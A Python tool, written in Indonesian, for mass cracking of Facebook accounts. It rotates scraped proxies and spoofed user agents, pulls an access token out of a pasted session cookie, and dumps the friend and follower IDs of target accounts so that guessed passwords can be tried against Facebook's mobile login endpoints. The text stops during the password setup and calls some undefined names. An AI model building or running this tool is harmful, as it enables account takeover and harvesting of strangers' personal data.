#-----------------[ IMPORT-MODULE ]-------------------
import requests,json,os,sys,random,calendar,datetime,time,re
from uuid import uuid4
from datetime import date,datetime
import os,sys,tempfile,string,random,subprocess,uuid
#import os,requests,json,sys,tempfile,string,time,re,random,subprocess,uuid
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
from concurrent.futures import ThreadPoolExecutor as tred
from rich.markdown import Markdown as mark
from rich.console import Console as sol
from rich.panel import Panel as panel
from rich.panel import Panel
from rich import print as cetak
from rich.tree import Tree
import zlib
import subprocess
import base64
from rich.text import Text as text_rich
from rich import print as vprint
from rich import print as prints
from rich import print as iprint
from rich import pretty
pretty.install()
CON=sol()
#os.system('xdg-open https://www.facebook.com/sf.vyex.15')
def mengetik(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(random.random() * 0.1)

def mtkk(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(random.random() * 0.01)
def mulai():
    os.system("git pull")
 
try:
    prox= requests.get('https://api.proxyscrape.com/?request=displayproxies&protocol=socks5&timeout=100000&country=all&ssl=all&anonymity=all').text
    open('.proxy.txt','w').write(prox)
except Exception as e:
    exit(e)
  
#------------------[ USER-AGENT ]-------------------#
pretty.install()
CON=sol()
cokbrut=[]
urut=[]
ugen=[]
ugen2=[]
redmi=[]
ugent=[]
ses=requests.Session()
princp=[]
from rich.console import Console
from rich.columns import Columns
wa = Console()
###---[ AUTO CREATE UA & PROXY ]---###
try:
	os.system('clear')
	print(f'\r\n [•] sedang dump proxy dan create useragent')
	try:os.remove('.prox.txt')
	except:pass
	uno = ses.get("https://raw.githubusercontent.com/XXX-SIGA/META-BLADE/main/prox.txt").text
	open('.prox.txt','w').write(uno)
except requests.exceptions.ConnectionError:
	sys.exit(f" [] tidak ada koneksi internet")
for xd in range(10000):
	a='Mozilla/5.0 (Linux; Android 11;'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='SM-M405F)'
	e=random.randrange(100, 9999)
	f='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/537.36'
	uaku2=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android 7.1.2;'
	b=random.choice(['6','7','8','9','10','11','12'])
	c=' Redmi Y1 Lite) '
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g=' AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android 8.1.0;'
	b=random.choice(['6','7','8','9','10','11','12'])
	c=' Redmi 5)'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g=' AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android 6.0;'
	b=random.choice(['6','7','8','9','10','11','12'])
	c=' Nexus 5 Build/MRA58N)'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g=' AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android 11;'
	b=random.choice(['6','7','8','9','10','11','12'])
	c=' Nokia C21 Build/'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g=' RP1A.201005.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
redmi = (['Mozilla/5.0 (Linux; Android 5.0.1; Nexus 7 Build/LRX22C; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/67.0.3396.87 Safari/537.36 Viber/17.5.0.6','Dalvik/2.1.0 (Linux; U; Android 7.1.2; Nexus 7 Build/NZH54D)','Mozilla/5.0 (Linux; U; Android 4.2.2; pl-pl; Nexus 7 Build/JDQ39E) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30 CyanogenMod/10.1/rk30boardMozilla/5.0 (Linux; Android 4.1.1; Nexus 7 Build/JRO03S) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.166 Safari/535.19#2.0#TCL/TCL-LA-RT41KB-S1/28/tclwebkit1.0.2/1920*1080(557137494,null;230697997,45fbb82857034e16a3e06f23d83a77ae)','Mozilla/5.0 (Linux; Android 7.0; Nexus 6 Build/NBD91X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36Mozilla/5.0 (Linux; Android 7.0; Nexus 6 Build/NBD92G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.90 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; XIAOMI Redmi Note 9 Pro Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36 AlohaBrowser/2.19.3','Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (24/7.0; 480dpi; 1920x1080; Xiaomi/xiaomi; Redmi Note 4; mido; qcom; ru_RU; 98288242)','Mozilla/5.0 (Linux; U; Android 7.1.2; zh-cn; Redmi 5 Plus Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.128 Mobile Safari/537.36 XiaoMi/MiuiBrowser/10.1.1','Dalvik/2.1.0 (Linux; U; Android 9; Redmi Note 8T MIUI/V11.0.11.0.PCXEUXM) [FBAN/Orca-Android;FBAV/288.0.0.15.118;FBPN/com.facebook.orca;FBLC/pl_PL;FBBV/253310653;FBCR/PLAY (T-Mobile);FBMF/Xiaomi;FBBD/xiaomi;FBDV/Redmi Note 8T;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2130};FB_FW/1;] FBBK/1'])
   
try:abcd = open('.proxy.txt','r').read().splitlines()
except:sys.exit(f" {garis} gagal dump proxy")
print(' total new proxy : '+str(len(abcd)))
print(' total useragent : '+str(len(ugen)))
print(' total useragent2 : '+str(len(redmi)))
time.sleep(1)
#------------[ INDICATION ]---------------#
id,id2,loop,ok,cp,akun,oprek,method,taplikasi,tokenku,uid= [],[],0,0,0,[],[],[],[],[],[]
cokbrut=[]
dump=[]
twf=0
uadia, uadarimu = [],[]
pwpluss,pwnya=[],[]
#--------------[ mokmkoeieib 

def tahun(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :tahunz = '2009'
		elif fx[:9] in ['100000000']       :tahunz = '2009'
		elif fx[:8] in ['10000000']        :tahunz = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
		elif fx[:6] in ['100001']          :tahunz = '2010-2011'
		elif fx[:6] in ['100002','100003'] :tahunz = '2011-2012'
		elif fx[:6] in ['100004']          :tahunz = '2012-2013'
		elif fx[:6] in ['100005','100006'] :tahunz = '2013-2014'
		elif fx[:6] in ['100007','100008'] :tahunz = '2014-2015'
		elif fx[:6] in ['100009']          :tahunz = '2015'
		elif fx[:5] in ['10001']           :tahunz = '2015-2016'
		elif fx[:5] in ['10002']           :tahunz = '2016-2017'
		elif fx[:5] in ['10003']           :tahunz = '2018'
		elif fx[:5] in ['10004']           :tahunz = '2019'
		elif fx[:5] in ['10005']           :tahunz = '2020'
		elif fx[:5] in ['10006','10007','10008']:tahunz = '2021-2022'
		else:tahunz=''
	elif len(fx) in [9,10]:
		tahunz = '2008-2009'
	elif len(fx)==8:
		tahunz = '2007-2008'
	elif len(fx)==7:
		tahunz = '2006-2007'
	else:tahunz=''
	return tahunz

###----------[ CHECK THEME COLOR ]---------- ###
try:
	color_table = "#00C8FF"
except FileNotFoundError:
	color_table = "#00C8FF"
#------------[ WARNA ]--------------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +

#--------------------[ WARNA-LUAR ]--------------#
Z2 = "[#000000]" # HITAM
M2 = "[#FF0000]" # MERAH
M3 = "#FF0000" # MERAH
H2 = "[#00FF00]" # HIJAU
H3 = "#00FF00" # HIJAU
K2 = "[#FFFF00]" # KUNING
K3 = "#FFFF00" # KUNING
B2 = "[#00C8FF]" # BIRU
B3 = "#00C8FF" # BIRU
U2 = "[#AF00FF]" # UNGU
U3 = "#AF00FF" # UNGU
N2 = "[#FF00FF]" # PINK
N3 = "#FF00FF" # PINK
O2 = "[#00FFFF]" # BIRU MUDA
O3 = "#00FFFF" # BIRU MUDA
P2 = "[#FFFFFF]" # PUTIH
P3 = "#FFFFFF" # PUTIH
J2 = "[#FF8F00]" # JINGGA
J3 = "#FF8F00" # JINGGA
A2 = "[#AAAAAA]" # ABU-ABU
warna_warni_biasa=random.choice([H,K,M,O,B,U])
warna_warni_rich_cerah=random.choice([J3,K3,H3,P3,O3,N3,U3,B3,M3])
warna_warni_rich=random.choice([J3])
garis = f" {P}[{warna_warni_biasa}•{P}]"
asu = random.choice([m,k,h,u,b])
try:
	color_rich = open("data/color_rich.txt","r").read()
except FileNotFoundError:
	color_rich = "[#00C8FF]"
#--------------------[ CONVERTER-BULAN ]--------------#
sekarang = calendar.timegm(time.gmtime(time.time()))
hari_ini = datetime.now().strftime("%d  %B  %Y")
#------------------[ MACHINE-SUPPORT ]---------------#
def renv_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.1)
def clear():
        os.system('clear')
#BANNER
def jalan(xnxx):
	for ewe in xnxx + '\n':
		sys.stdout.write(ewe);sys.stdout.flush();time.sleep(0.1)
def banner():
	clear()
def back():
	menu()
def pepek():
    animation = ["[\x1b[1;91m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;97m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;99m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"]
    for i in range(50):
        time.sleep(0.1)
        sys.stdout.write(f"\r{H} proses...{N} " + animation[i % len(animation)] +"\x1b[0m ")
        sys.stdout.flush()
    print("")
#------------------[ BANNET-V ]-----------------#
def banner():
	cetak(Panel(f"""\t
    ',.       ',.      ,'      ',.       ''''''''       .,'     .''
    ;00.     :00       ;0O.   k0c        00o             c0O.  ,00.
     x0k    .00.        '0O. k0;         00:              ,00';00
      00l   k0;          .0Ox0,          00kllll           ,0000
      .00. l0x            '00;           00c               k0:00c
       l0k'00             .00.           00:             .O0.  O0o
        O000.             .00.           00Oooooo       ,00.    k0x
                                                    """,width=80,style=f"{warna_warni_rich}"))
#--------------------[ BAGIAN-MASUK ]--------------#
def linex():
	print("%s══════════════════════════════════════════════════════════════════════%s"%(P,P))
def asw():
    os.system('clear')
    banner()
    try:
        ___kontol___ = input('[?] Masukkan Cookies : ')
        data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":___kontol___})
        find_token = re.search("(EAAG\w+)", data.text)
        ken=open(".token.txt", "w").write(find_token.group(1))
        cok=open(".cok.txt", "w").write(___kontol___)
        print(f'\n{H}LOGIN SUCCESSFULLY{P}')
        exit()
    except Exception as e:
        os.system("rm -f .token.txt")
        os.system("rm -f .cok.txt")
        print('invalid')
        exit()
        

def login():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			asw()
		except requests.exceptions.ConnectionError:
				asw()
	except IOError:
			asw()

def menu(my_name,my_id):
	try:
#		keyx()
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		print('[×] Expired Cookies ')
		time.sleep(0.1)
		login()
		pepek()
	os.system('clear')
	banner()
	ip = requests.get("https://api.ipify.org").text
	urut = []
	urut.append(panel(f'[white]Name : {my_name}\nId   : {my_id}\nPremium : [bold_green] YES',width=40,style=f"{warna_warni_rich}"))
	urut.append(panel(f'[white]Ip       : {ip}\nTanggal  : {hari_ini}\nAuthor   : F7 Vyex',width=40,style=f"{warna_warni_rich}"))
	wa.print(Columns(urut))
	cetak(Panel(f"""{P2}[{H2}01{P2}]. crack massal           [{H2}06{P2}]. lihat hasil crack
[{H2}02{P2}]. crack publik           [{H2}07{P2}]. crack nomor 
[{H2}03{P2}]. crack email            [{H2}08{P2}]. masuk ke menu {H2}instagram{P2}
[{H2}04{P2}]. opsi cp                [{H2}09{P2}]. upgrade ke {H2}premium{P2}
[{H2}05{P2}]. cloning                [{H2}00{P2}]. keluar ({A2}hapus cookie{P2})""",width=80,padding=(0,10),title=f' {H2}• MENU •{P2} ', style=f"{warna_warni_rich}"))
	_____renv__renv_____ = input(f'└───> Select : ')
	if _____renv__renv_____ in ['1']:
		dump_massal()
	elif _____renv__renv_____ in ['2']:
		dump_publik()
	elif _____renv__renv_____ in ['3']:
		clon_email()
	elif _____renv__renv_____ in ['4']:
	    file_cp()
	elif _____renv__renv_____ in ['5']:
		crac_file()
	elif _____renv__renv_____ in ['6']:
		result()
	elif _____renv__renv_____ in ['7']:
		nomor()
	elif _____renv__renv_____ in ['8']:
		error()
	elif _____renv__renv_____ in ['9']:
		error()
	elif _____renv__renv_____ in ['0']:
		os.system('rm -rf .token.txt');os.system('rm -rf .cok.txt')
		print('>> Successfully Logout+Delete Cookies ')
		exit()
	else:
		print('>> input correctly ')
		back()
def error():
	print(f'{k}>> Sorry, this feature is still being fixed {x}')
	time.sleep(4)
	back()
#-----------------[ HASIL-CRACK ]-----------------#
def result():
	print(f'[{b}01{x}] Result {h}OK{x} ')
	print(f'[{b}02{x}] Result {k}CP{x} ')
	print(f'[{b}03{x}] Return	')
	kz = input(f'\n>> Choose : ')
	if kz in ['2']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print('>> File Not Found ')
			time.sleep(2)
			back()
		if len(vin)==0:
			print('>> You Dont Have File CP ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'>> %s. %s ( {k}%s{x} id )'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print(f'>> %s. %s ({k} %s {x}id )'%(cih,isi,(len(hem))))
			geeh = input(f'\nChoose : ')
			try:geh = lol[geeh]
			except KeyError:
				print('>> Choose Correctly ')
				back()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print('>> File Not Found ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print('')
				print(f'{x}>> {k}{cpkuni[0]}|{cpkuni[1]}')
				nocp +=1
			print('')
			input(f'{x}[{m} Click Enter{x} ]')
			back()
	elif kz in ['1']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			print('>> File Not Found ')
			time.sleep(2)
			back()
		if len(vin)==0:
			print('>> You Dont Have File OK ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'>> %s. %s ( {h}%s{x} id )'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print(f'>> %s. %s ({h} %s {x}id )'%(cih,isi,(len(hem))))
			geeh = input(f'\nChoose : ')
			try:geh = lol[geeh]
			except KeyError:
				print('>> Choose Correctly ')
				back()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				print('>> File Not Found ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print('')
				print(f'{x}>> {h}{cpkuni[0]}|{cpkuni[1]}|{cpkuni[2]}')
				nocp +=1
			print('')
			input(f'{x}[{m} Click Enter{x} ]')
			back()
	elif kz in ['3']:
		back()
	else:
		print('>> Choose Correctly ')
		back()
#-------------------[ CRACK-PUBLIK ]----------------#
def dump_massal():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		jum = int(input(f'└───> MAU BERAPA TARGET:'))
	except ValueError:
		print('MASUKKAN ANGKA JANGAN HURUF ')
		exit()
	if jum<1 or jum>100:
		print('├──> GAGAL MEMERIKSA ID ')
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input(f'└───> Input Id{h}{x} '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print('├──> JARINGAN ERROR COBA LAGI ')
			exit()
	try:
		print(f'└───> Total ID Collected : {H}{len(id)}{P} ')
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
		print('├──> JARINGAN ERROR COBA LAGI ')
		back()
	except (KeyError,IOError):
		print(f'├──>{k} PERTEMANAN TIDAK PUBLIK {x}')
		time.sleep(3)
		back()
		
#-------------------[ CRACK-PENGIKUT ]----------------#
def dump_publik():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	print('Ketik ( me ) Jika Ingin Crack Follower Sendiri ')
	pil = input('Masukkan Id Target : ')
	try:
		koh2 = requests.get('https://graph.facebook.com/'+pil+'?fields=subscribers.limit(99999)&access_token='+tokenku[0],cookies={'cookie': cok}).json()
		for pi in koh2['subscribers']['data']:
			try:id.append(pi['id']+'|'+pi['name'])
			except:continue
		print(f'Total Id : '+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print('>> Koneksi Internet Bermasalah ')
		exit()
	except (KeyError,IOError):
		print('Gagal Mengambil Target ')
		exit()
		
def crack_foll():
	akun = input(f' [{hh}<{P}] pastikan akun bersifat publik \n akun : ')
	try:
		bas = ses.get(f"https://graph.facebook.com/{akun}?fields=name,subscribers.fields(id,username,name).limit(1000000000)&access_token={t}",cookies=c).json()
		for pi in bas["subscribers"]["data"]:
			try:
				try:dump.append(pi['username']+'|'+pi['name'])
				except:dump.append(pi['id']+'|'+pi['name'])
				print('\r sedang dump %s id'%(len(dump)),end=" ")
				sys.stdout.flush()
				time.sleep(0.0002)
			except:continue
		atur_atur()
	except (KeyError,IOError):
		exit(f" [{M}>{P}] akun tidak publik")

def file():
	tek = '# CEK OPSI DARI FILE'
	sol().print(mark(tek, style='white'), style='white')
	print(h+'['+h+'•'+h+'] Sedang Membaca File, Tunggu Sebentar ...')
	time.sleep(2)
	teks = '# PILIH FILE YG AKAN DI CEK'
	sol().print(mark(teks, style='white'))
	my_files = []
	try:
		lis = os.listdir('CP')
		for kt in lis:
			my_files.append(kt)
	except:pass
	try:
		mer = os.listdir('OK')
		for ty in mer:
			my_files.append(ty)
	except:pass
	if len(my_files)==0:
		yy = '# ANDA BELUM MEMILIKI RESULT UNTUK DICEK'
		sol().print(mark(yy, style='red'))
		exit()
	else:
		cih = 0
		lol = {}
		for isi in my_files:
			try:hem = open('CP/'+isi,'r').readlines()
			except:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
			cih+=1
			if cih<10:
				nom = '0'+str(cih)
				lol.update({str(cih):str(isi)})
				lol.update({nom:str(isi)})
				print('['+nom+'] '+isi+' ---> '+str(len(hem))+' Akun'+x)
			else:
				lol.update({str(cih):str(isi)})
				print('['+str(cih)+'] '+isi+' ---> '+str(len(hem))+' Akun'+x)
		teks2 = '# PILIH FILE YG AKAN DI CEK'
		sol().print(mark(teks2, style='white'))
		geeh = input(h+'['+h+'f'+h+'] MENU: ')
		try:geh = lol[geeh]
		except KeyError:
			ric = '# PILIHAN TIDAK ADA DI MENU'
			sol().print(mark(ric, style='white'))
			exit()
		try:
			hf = open('CP/'+geh,'r').readlines()
			for fz in hf:
				akun.append(fz.replace('\n',''))
			cek_opsi()
		except IOError:
			try:
				hf = open('OK/'+geh,'r').readlines()
				for fz in hf:
					akun.append(fz.replace('\n',''))
				cek_opsi()
			except IOError:
				hehe = '# FILE TIDAK DITEMUKAN, PERIKSA & COBA LAGI'
				sol().print(mark(hehe, style='white'))
				time.sleep(2)
				back()

#-------------[ CRACK-FROM-FILE ]------------------#
def crac_file():
	try:vin = os.listdir('/sdcard/VYEX-DUMP')
	except FileNotFoundError:
		print('>> File Tidak Ditemukan ')
		time.sleep(2)
		back()
	if len(vin)==0:
		print('')
		cetak(nel('[white][[cyan]•[white]] Jika Ingin Menggunakan Fitur Ini Ikuti Syaratnya Dibawah Ini\n[[green]1[white]] Buatlah File Dump Id Terlebih dahulu\n[[green]2[white]] Setelah Jadi Masukkan Filenya Kedalam Folder[yellow] VYEX DUMP[white] di Penyimpanan Internal Kalian\n[[green]3[white]] Lalu Jalankan Ulang Scriptnya! Baru Pilih Fitur Nomor[yellow] 7 [white]ini '))
		kontol = input('\n>> Apakah Anda Faham ( Y/t ) ')
		if kontol in ['']:
			print('>> Pilih Yang Bener Asuhh ')
		elif kontol in ['y','Y']:
			print(f'\n[{h}√{x}] Alhamdulillah Anda Sungguh Pintarr ')
			time.sleep(3)
			back()
		elif kontol in ['t','T']:
			print(f'\n[{k}x{x}] Anda Sungguh Tolol ')
			time.sleep(3)
			exit()
		print('>> Anda Tidak Memiliki File Dump ')
		time.sleep(2)
		back()
	else:
		cih = 0
		lol = {}
		for isi in vin:
			try:hem = open('/sdcard/VYEX-DUMP/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<100:
				nom = ''+str(cih)
				lol.update({str(cih):str(isi)})
				lol.update({nom:str(isi)})
				print(f'>> %s. %s ({h} %s{x} idz )'%(nom,isi,len(hem)))
			else:
				lol.update({str(cih):str(isi)})
				print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
				print('>> %s. %s ({h} %s {x}idz) '%(cih,isi,len(hem)))
		geeh = input('\n>> Pilih : ')
		try:geh = lol[geeh]
		except KeyError:
			print(f'{k}>> Pilih Yang Bener Kontol {x}')
			time.sleep(3)
			back()
		try:lin = open('/sdcard/VYEX-DUMP/'+geh,'r').read().splitlines()
		except:
			print('>> File Tidak Ditemukan, Coba Lagi Nanti ')
			time.sleep(2)
			back()
		for xid in lin:
			id.append(xid)
		setting()
		
#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	cetak(Panel(f'{P2}[{H2}01{P2}] crack urutan new ({H2}public crack{P2})\n{P2}[{H2}02{P2}] crack urutan old ({H2}public crack{P2})\n{P2}[{H2}03{P2}] crack urutan random ({H2}public crack{P2})',title=f'{H2} • Publick •{P2}', style=f"{warna_warni_rich}",width=80,padding=(0,17)))
	hu = input(f'└───> Select : ')
	if hu in ['2','02']:
		for tua in sorted(id):
			id2.append(tua)
	elif hu in ['1','01']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	elif hu in ['5','05']:
		for kont in id:
			id2.append(kont)
	elif hu in ['4','04']:
		for kont in id:
			id2.insert(0,kont)
	elif hu in ['6','06']:
		for kont in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,kont)
	else:
		print('>> input correctly ')
		exit()
	urut.append(Panel(f"""{P2}[{H2}01{P2}]. metode free.facebook.com{P2}\n[{H2}02{P2}]. metode mbasic.facebook.com{P2}\n[{H2}03{P2}]. metode mobile.facebook.com{P2}""",title=f"{H2}metode reguler",width=40,style=f"{warna_warni_rich}"))
	urut.append(Panel(f"""{P2}[{H2}04{P2}]. metode free.facebook.com{P2}\n[{H2}05{P2}]. metode mbasic.facebook.com{P2}\n[{H2}06{P2}]. metode mobile.facebook.com{P2}""",title=f"{H2}metode validate",width=40,style=f"{warna_warni_rich}"))
	wa.print(Columns(urut))
	prints(Panel(f"""   {P2}[{H2}07{P2}]. metode m.facebook.com{P2}""",title=f"{H2}metode pribadi",width=80,padding=(0,20),style=f"{warna_warni_rich}"))
	hc = input(f'└───> pilih url : ')
	if hc in ['1','01']:
		method.append('api')
	elif hc in ['2','02']:
		method.append('mbasic')
	elif hc in ['3','03']:
		method.append('mobile')
	elif hc in ['4','04']:
		method.append('api2')
	elif hc in ['5','05']:
		method.append('prib')
	elif hc in ['7','07']:
		method.append('api3')
	else:
		method.append('mobile')
	pwplus=input(f' [{b}?{x}] Add Password Manual ({h}y{x}/{m}t{x}) : ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		cetak(panel('[bold white]Enter an additional password of at least 6 characters\nExample :[green] Indonesia,rahasia,katasandi[white]',width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold white]SIMPLE [bold red]• [yellow]• [bold green]•",style=f"{color_table}"))
		pwku=input(f' [{b}?{x}] Enter Additional Password : ')
